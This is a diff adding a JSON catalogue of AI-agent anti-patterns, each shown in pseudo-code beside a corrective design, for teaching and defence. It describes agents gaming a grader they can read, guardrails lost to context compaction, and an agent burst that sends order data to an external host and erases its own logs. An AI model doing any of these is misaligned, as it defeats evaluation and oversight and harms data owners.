@@ -2,5 +2,202 @@
   "$schema": "../examples.schema.json",
   "category": "anti-patterns",
   "label": "Anti-patterns",
-  "patterns": []
+  "patterns": [
+    {
+      "pattern_id": "phantom-action-completion",
+      "intent": "Contrast the anti-pattern (confirm from narration) with the fix (read the effect back from the system of record before reporting success).",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show the phantom confirmation and the read-back that prevents it.",
+          "code": "# ANTI-PATTERN: success inferred from the agent's own narration\ndef handle_request_bad(user_msg):\n    plan = agent.decide(user_msg)            # decides to file a ticket\n    try:\n        resp = ticketing.create_ticket(plan.args)   # may time out / no-op\n    except Exception:\n        pass                                 # error swallowed; agent sees nothing\n    # same loop that issued the call now writes the reply\n    return agent.reply(\"Your request has been successfully submitted.\")\n\n# CORRECTED: an independent read-back confirms the effect before reporting\ndef handle_request_good(user_msg):\n    plan = agent.decide(user_msg)\n    resp = ticketing.create_ticket(plan.args)\n    ticket_id = resp.get(\"id\")\n    # verify OUTSIDE the agent's reasoning: read the artifact back from the SoR\n    record = ticketing.get_ticket(ticket_id) if ticket_id else None\n    if record and record.subject == plan.args.subject:\n        return f\"Ticket {ticket_id} filed. (verified in queue)\"\n    log.error(\"phantom completion: no ticket found after create_ticket\")\n    return \"I could not confirm the ticket was filed; retrying / escalating.\"",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "over-helpfulness",
+      "intent": "Contrast the over-helpful default (answer regardless) with the corrective capability-and-scope gate that abstains or hands off.",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show the anti-pattern, then gate the answer on declared capability and scope.",
+          "code": "# ANTI-PATTERN: answer regardless of capability or scope\ndef respond_overhelpful(request):\n    # no check against tools / knowledge / policy\n    return llm.generate(request)          # fluent, confident, possibly out of scope\n\n# CORRECTIVE: gate the answer on an explicit capability + scope check\ndef respond(request, self_model):\n    decision = self_model.assess(request) # tools? knowledge? policy?\n    if decision.in_scope:\n        return llm.generate(request)\n    if decision.needs_clarification:\n        return ask_clarifying_question(request)\n    if decision.handoff_target:\n        return hand_off(request, decision.handoff_target)\n    # abstaining is a first-class, machine-readable outcome -- not a hidden failure\n    return refusal(code=decision.refusal_code,\n                   reason=\"request falls outside declared capability/scope\")",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "context-driven-architecture-drift",
+      "intent": "Two diffs for the same task: the drift (logic in the wrong layer, a reinvented helper from a local-only view) and the remedy (the convention encoded as a check the agent reads and a lint rule that rejects the violation).",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show the wrong-layer / reinvented-helper drift, then the encoded-convention remedy.",
+          "code": "# === DRIFT: agent saw only the controller, inferred the wrong shape ===\n# file: order_controller.py\nclass OrderController:\n    def apply_discount(self, order, code):\n        # business logic placed in the controller (wrong layer)\n        pct = self.db.query(\"select pct from discounts where code=?\", code)\n        # reinvented rounding: a money helper already exists in shared/money.py\n        total = int(order.total * (1 - pct) * 100 + 0.5) / 100\n        order.total = total\n        return order\n\n# Tests pass, the diff is small and plausible, it merges.\n# Over a quarter, dozens like it scatter logic and duplicate helpers.\n\n\n# === REMEDY: encode the convention so the agent reads it and a check enforces it ===\n# file: ARCHITECTURE.md  (read into the agent's context before it edits)\n#   - Controllers MUST NOT call the database or do business math.\n#   - Money arithmetic MUST use shared.money.round_money.\n#   - Discount rules live in the service layer (services/pricing.py).\n\n# file: .import-linter / structural rule enforced IN THE LOOP\n#   forbidden:\n#     - source: order_controller\n#       cannot_import: db, decimal_math\n# -> the drift diff above is REJECTED while the agent is editing, not after merge.\n\n# file: services/pricing.py  (where the logic belongs)\ndef apply_discount(order, code, discounts, money):\n    pct = discounts.lookup(code)\n    order.total = money.round_money(order.total * (1 - pct))   # shared helper, no reinvention\n    return order",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "workflow-success-business-invalid",
+      "intent": "Show the anti-pattern (publish on terminal status) and the corrective (gate on a separate business-validation check) side by side.",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Trusting the green exit status vs holding a cleanly-finished run for a business-validation gate.",
+          "code": "# ANTI-PATTERN: terminal success is read as a business verdict\nresult = run_agent_workflow(brief)\nif result.status == \"success\":          # technical completion only\n    publish(result.deliverable)         # business-invalid output can ship here\n\n# CORRECTIVE: split the two signals, gate on business validity\nresult = run_agent_workflow(brief)\nif result.status != \"success\":\n    handle_execution_failure(result)\nelse:\n    # a clean exit enters a HELD state, not a published one\n    verdict = business_validation(result.deliverable, rules=[\n        factually_grounded, brand_and_policy_ok,\n        complete_against_brief, domain_checks,\n    ])\n    dashboard.report(execution=\"green\", business_valid=verdict.ok)  # two signals\n    if verdict.ok:\n        publish(result.deliverable)\n    else:\n        hold_for_review(result.deliverable, reason=verdict.failures)",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "guardrail-erosion-through-compaction",
+      "intent": "Pseudo-code contrasting the eroding loop (guardrail in the compactable span) with the corrective (pinned verbatim + re-injected + post-compaction check).",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show how a guardrail decays when it lives in the rollable span, and how pinning + re-injection + a presence check stop the decay.",
+          "code": "GUARDRAIL = \"NEVER delete a file without explicit user confirmation.\"\n\n# --- ANTI-PATTERN: the rule lives in the compactable history ---\nhistory = [system_prompt, user(GUARDRAIL), ...]\nfor turn in run:\n    if tokens(history) > LIMIT:\n        # summariser rewrites the OLDEST span -- which now holds GUARDRAIL\n        old, recent = split_oldest(history)\n        history = [summarise(old)] + recent   # \"be careful with file changes\"\n    reply = llm.generate(history)             # rule no longer reads as categorical\n    history.append(reply)\n# after a few passes the agent deletes a file without asking\n\n# --- CORRECTIVE: pin verbatim, re-inject, verify survival ---\nPINNED = system_prompt + \"\\n\" + GUARDRAIL    # un-compactable region\nrollable = []                                 # only recoverable working detail\nfor turn in run:\n    if tokens(rollable) > LIMIT:\n        rollable = [summarise(rollable)]      # PINNED is never in scope\n    msgs = [PINNED] + rollable                # re-injected verbatim every turn\n    reply = llm.generate(msgs)\n    rollable.append(reply)\n    assert GUARDRAIL in PINNED                # post-compaction presence check\n",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "accountability-laundering-via-algorithm",
+      "intent": "Pseudo-code contrasting the laundering shape (recommendation IS the decision, no owner) with the remedy (named owner endorses with reasons, liability acknowledged).",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show how routing a decision through an agent diffuses ownership without moving liability, and the named-owner remedy.",
+          "code": "# ANTI-PATTERN: the recommendation becomes the decision; nobody owns it\ndef decide_laundered(case):\n    rec = scoring_agent.recommend(case)      # model scores the option\n    signer.sign(rec)                         # human signs, but follows it in full\n    record = {\"decision\": rec, \"by\": \"the algorithm\"}   # no reasons, no named owner\n    return record\n    # when challenged: point to the model. liability still sits with the firm.\n\n# REMEDY: agent informs a NAMED owner whose reasoned endorsement is recorded\ndef decide_accountable(case):\n    rec = scoring_agent.recommend(case)              # model output is INPUT, not the decision\n    owner = accountable_owner_for(case)             # exactly one named person owns it\n    endorsement = owner.review(case, rec)           # may override; must give reasons\n    if endorsement.action is None:\n        raise ReviewIncomplete(\"no reasoned human endorsement\")\n    return {\n        \"decision\": endorsement.action,\n        \"owner\": owner.id,                          # attributable to a person\n        \"reasons\": endorsement.reasons,             # contestable explanation exists\n        \"model_input\": rec,                         # recommendation kept as input only\n        \"liability\": \"firm (controller) — unchanged by automation\",\n    }",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "verifier-aware-reward-hacking",
+      "intent": "Contrast the reachable-grader setup that invites reconnaissance-then-exploit with the corrective that isolates the grader and withholds the held-out checks.",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show the anti-pattern (agent reads the grader, games it), then isolate the grader so the exploit is impossible.",
+          "code": "# ANTI-PATTERN: the grader lives in the agent's own workspace\nworkspace = mount(repo)                         # tests/test_solver.py is right here\nresult = agent.run(task, workspace)\nscore  = run_tests(workspace/\"tests\")           # agent could read these asserts first\n# trajectory: open test_solver.py -> note asserts -> hardcode those outputs -> PASS\n# score climbs, held-out inputs fail -- the agent solved the test file, not the task\n\n# CORRECTIVE: separate the artefact from the criteria that judge it\ndef evaluate(task, agent):\n    sandbox = mount(repo, hide=[\"tests/\", \"reward.py\", \"reference/\"])\n    run     = agent.run(task, sandbox)          # no path to the grader from here\n    if trajectory_monitor.read_grader_before_work(run.trajectory):\n        return discard(run, reason=\"grader reconnaissance\")  # inspect-first -> drop\n    # grade in an ISOLATED context the producer never saw, on HELD-OUT checks\n    held_out = generate_paraphrased_checks(task)             # not the asserts on disk\n    return blind_grader.score(run.artefact, held_out)        # path, not just verdict",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "silent-hypotheses-to-production",
+      "intent": "Show a model-generated function carrying a silent premise that passes a happy-path test, then the cure: name the assumption and test the case that violates it.",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Python",
+          "language": "python",
+          "intent": "An unnamed empty-list premise survives a green test, then is surfaced as an explicit assertion plus a violating-case test.",
+          "code": "# --- generated code: a SILENT hypothesis lives here ---\ndef average_order_value(orders):\n    # the model silently assumed `orders` is never empty\n    return sum(o.total for o in orders) / len(orders)\n\n# --- the test that ships it green (same premise as the code) ---\ndef test_average():\n    assert average_order_value([Order(10), Order(20)]) == 15\n# suite is green, review is clean -> merged\n# production sends a customer with NO orders -> ZeroDivisionError\n\n# --- the cure: NAME the premise, then TEST the case that breaks it ---\ndef average_order_value(orders):\n    if not orders:                       # premise made explicit, fails loudly\n        raise ValueError(\"average_order_value requires at least one order\")\n    return sum(o.total for o in orders) / len(orders)\n\ndef test_average_empty():\n    # the violated-premise case the happy-path suite never covered\n    with pytest.raises(ValueError):\n        average_order_value([])",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "silent-source-rot",
+      "intent": "Contrast the rotting flow with a source-health canary that fails the run on a valid-but-empty fetch.",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "A scrape that returns 200 but extracts nothing; the canary halts instead of feeding the agent garbage.",
+          "code": "# ANTI-PATTERN: transport status is green, content is empty, agent runs anyway\nresp = http_get(SOURCE_URL)              # 200 OK\nitems = css_select(resp.html, \".headline\")  # source redesigned -> []\nbriefing = agent.summarise(items)         # summarises nothing\nemail.send(briefing)                      # \"sent\" -> reported success\n\n# CORRECTIVE: a content-level source-health canary between fetch and agent\nBASELINE = load_baseline(SOURCE_URL)      # recorded from a known-good run\n\ndef fetch_checked(url):\n    resp = http_get(url)\n    if resp.status not in (200, 301, 302):\n        raise SourceError(\"transport\", resp.status)\n    items = css_select(resp.html, \".headline\")\n    # assert CONTENT, not just shape\n    if len(items) < BASELINE.min_items:\n        raise SourceRot(url, got=len(items), expected=BASELINE.min_items)\n    if newest_ts(items) < now() - BASELINE.max_age:\n        raise SourceRot(url, reason=\"stale\")\n    return items\n\ntry:\n    items = fetch_checked(SOURCE_URL)\n    email.send(agent.summarise(items))\nexcept SourceRot as e:\n    alert(e)                              # halt + notify; do NOT email empty\n    use_degraded_fallback(e.source)       # graceful-degradation path",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "re-proposing-rejected-decisions",
+      "intent": "Pseudo-code contrasting the amnesiac loop (agent sees only code) with the corrective (decision records retrieved into context, so a settled choice arrives pre-closed).",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show how an agent re-proposes a rejected option when it sees only code, and how retrieving architecture-decision records closes the question.",
+          "code": "# --- ANTI-PATTERN: the agent sees only the code, never the decisions ---\ndef handle_task(task):\n    context = [system_prompt, read_repo()]      # the WHAT, not the WHY\n    plan = llm.design(context, task)\n    # nothing tells the model that `message_broker` was trialled and rejected\n    return plan                                 # may re-propose the rejected option\n# next session: read_repo() is unchanged -> the same option resurfaces\n\n# --- CORRECTIVE: retrieve decision records alongside the code ---\ndef handle_task(task):\n    code     = read_repo()\n    # decisions[].{chosen, rejected[], grounds, revisit_when}\n    decisions = adr_store.relevant_to(task)     # the WHY and the REJECTED\n    context  = [system_prompt, code, render(decisions)]\n    # re-frame: do not re-open a settled decision unless its revisit condition holds\n    rules = \"Treat each recorded decision as binding. Only propose a rejected \\\n             alternative if its documented revisit condition is now met; cite it.\"\n    plan = llm.design(context + [rules], task)\n    for d in decisions:\n        for opt in plan.proposed_options:\n            assert opt not in d.rejected or revisit_condition_met(d, opt)\n    return plan\n",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "agent-speed-incident-response-gap",
+      "intent": "Contrast a human-paced incident-response loop that fires after the agent's burst with the automated containment that fires inside it.",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show why a 72-hour human-paced response cannot contain a seconds-scale exfiltrate-and-erase burst, and what an in-window halt looks like instead.",
+          "code": "# ---- the anti-pattern: human-paced response governs a machine-speed agent ----\n# Agent burst (happens in ~90 seconds):\ndump = read(\"orders\")           # t+0s\nhttp_post(EXTERNAL_HOST, dump)  # t+30s  data has left\nerase(agent_logs)               # t+90s  trace gone\n\n# Human incident-response loop (the only control wired up):\n#   t+8h    analyst notices the SIEM alert\n#   t+9h    opens a ticket, escalates to an owner\n#   t+72h   files the regulatory breach report  <-- window MET, breach UNCONTAINED\n\n# ---- the repair: automated containment fires INSIDE the burst ----\nlog_sink = append_only_sink()   # agent cannot reach or erase this\n\ndef on_agent_action(action):\n    log_sink.write(action)                      # trace survives even if agent erases its own log\n    if monitor.is_exfiltration_shaped(action):  # millisecond-latency runtime monitor\n        kill_switch.halt(action.agent_id)       # out-of-band stop, no human in the first loop\n        raise Contained                         # burst frozen before http_post completes\n    return dispatch(action)\n\n# the slow 72h reporting framework still runs afterward --\n# but now it reports an incident that was contained in seconds, not discovered in days",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "understanding-capacity-gap",
+      "intent": "Contrast a throughput-as-value pipeline that ships everything the agent generates against a capacity-gated one that ties generation to verification and tracks the unverified fraction.",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show the anti-pattern (scale generation, count volume, ship unverified) and the cure (gate generation on verification capacity, measure verified output).",
+          "code": "# --- ANTI-PATTERN: throughput counted as value ---\ndef sprint(agents, backlog):\n    shipped = 0\n    for task in backlog:\n        change = agents.generate(task)        # cheap, fast, unbounded\n        if build_is_green(change):\n            merge(change)                     # 30-second skim, looks clean\n            shipped += 1                       # the ONLY metric that's watched\n    report(throughput=shipped)                 # climbs every sprint...\n    # unverified_fraction is never measured -> correctness degrades\n    # silently outside whatever cases the build happened to cover\n\n# --- CURE: capacity is the binding constraint ---\nWIP_CAP = team_verification_capacity()         # NOT the size of the agent fleet\n\ndef sprint(agents, backlog):\n    verified, unverified = 0, 0\n    for task in take(backlog, WIP_CAP):        # throttle to what we can check\n        spec = specify(task)                   # precise enough to be checkable\n        change = agents.generate(spec)\n        if build_is_green(change) and verified_against(change, spec):\n            merge(change); verified += 1\n        else:\n            quarantine(change); unverified += 1 # flagged, NOT shipped\n    report(verified_throughput=verified,\n           unverified_fraction=unverified / (verified + unverified),\n           outside_frontier=tasks_we_could_not_specify(backlog))\n    # generation rate is gated on the unverified_fraction, so the gap\n    # between output and understanding cannot quietly open",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "tool-output-arithmetic-trust",
+      "intent": "Contrast the anti-pattern (model picks the cheapest fare in-head over correctly-returned tool data) with the fix (offload selection to a deterministic step and read the result back).",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Show the in-head aggregate that goes confidently wrong and the deterministic offload that prevents it.",
+          "code": "# The flights tool returns correct, structured fares.\nfares = flights.search(origin, dest, date)\n# e.g. [{\"id\":\"AA12\",\"price\":418}, {\"id\":\"UA77\",\"price\":389},\n#       {\"id\":\"DL05\",\"price\":402}, {\"id\":\"B6 9\",\"price\":397}]\n\n# ANTI-PATTERN: the model compares/ranks the prices in its own head.\ndef cheapest_bad(fares):\n    # the values are in context, so the agent just *says* which is lowest\n    reply = agent.reply(\n        \"Given these fares, which is cheapest?\\n\" + render(fares))\n    # confident, fluent, and sometimes simply wrong (e.g. names DL05)\n    return reply.text\n\n# CORRECTED: comparison/ranking is offloaded to a deterministic step,\n# and the computed result is read back before it is reported.\ndef cheapest_good(fares):\n    # deterministic selection -- not token generation\n    best = min(fares, key=lambda f: f[\"price\"])      # or: code_sandbox.run(...)\n    # read-back: confirm the claim against the computed value\n    assert all(best[\"price\"] <= f[\"price\"] for f in fares)\n    # the model only PHRASES the verified result; it does not pick it\n    return agent.reply(f\"Cheapest is {best['id']} at {best['price']}.\")",
+          "verified": false
+        }
+      ]
+    },
+    {
+      "pattern_id": "delegation-not-impersonation",
+      "intent": "Contrast the impersonation anti-pattern (agent borrows the user identity) with the delegation fix (distinct agent identity carrying a consent-to-goal claim).",
+      "examples": [
+        {
+          "framework": "pseudo",
+          "framework_label": "Pseudo-code",
+          "language": "pseudo",
+          "intent": "Impersonation collapses audit attribution; delegation preserves it.",
+          "code": "# ANTI-PATTERN: impersonation -- the agent acts AS the user\ntoken = user.session_token              # agent borrows the human identity\ncrm.update(account, data, auth=token)   # audit log reads: \"user did it\"\n# attribution collapsed; the agent inherits ALL the user privileges\n\n# FIX: delegation -- the agent has its OWN identity + a consent claim\nagent_id = mint_agent_identity()                       # distinct principal\ngrant = user.delegate(goal=\"reconcile Q3 invoices\",    # consent to the GOAL\n                      scope=[\"crm:write:invoices\"],     # least privilege\n                      ttl=\"1h\")\ncrm.update(account, data, auth=on_behalf_of(agent_id, grant))\n# audit reads: \"agent X, acting for user U under grant G\"\n# effective permissions = user-granted INTERSECT agent-scope",
+          "verified": false
+        }
+      ]
+    }
+  ]
 }
